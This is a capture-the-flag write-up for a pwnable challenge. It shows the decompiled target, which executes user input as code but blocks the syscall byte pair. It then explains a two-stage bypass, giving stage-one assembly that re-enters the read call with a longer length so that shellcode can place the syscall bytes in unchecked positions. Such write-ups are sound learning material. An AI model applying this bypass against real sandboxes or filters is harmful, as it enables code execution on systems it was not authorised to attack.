# pwnable_noSyscall

syscall(0xf 0x5) cannot be used! Therefore, I controlled the flow to make syscall not restrained. 
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( buf == (void *)-1LL )
  {
    puts("mmap failed");
    exit(1);
  }
  alarm(0xAu);
  read(0, buf, 0x400uLL);
  for ( i = 0; i <= 1022; ++i )
  {
    if ( *((_BYTE *)buf + i) == 0xF && *((_BYTE *)buf + i + 1) == 5 )
    {
      puts("No syscall byte :P");
      exit(-1);
    }
  }
  ((void (__fastcall *)(_QWORD, void *))buf)(0LL, buf);
  return 0;
}
```

payload1: 
r12 has the address of the text area, so using r12, I made the flow go back to .text+0x99D, and made the edx 0x402. 

.text:0000000000000998                 mov     edx, 400h       ; nbytes
.text:000000000000099D                 mov     rsi, rax        ; buf
.text:00000000000009A0                 mov     edi, 0          ; fd
.text:00000000000009A5                 call    read
```
payload1
mov edx, 0x402
add r12, 0x1cd
mov rax, rsi
call r12
```

Now, the second input can be 402 bytes in length, and buf+401, buf+402 bytes will not be checked. Therefore, we can write 0x0f to buf+401 and 0x05 to buf+402.

**payload2**=usual x64 shellcode!


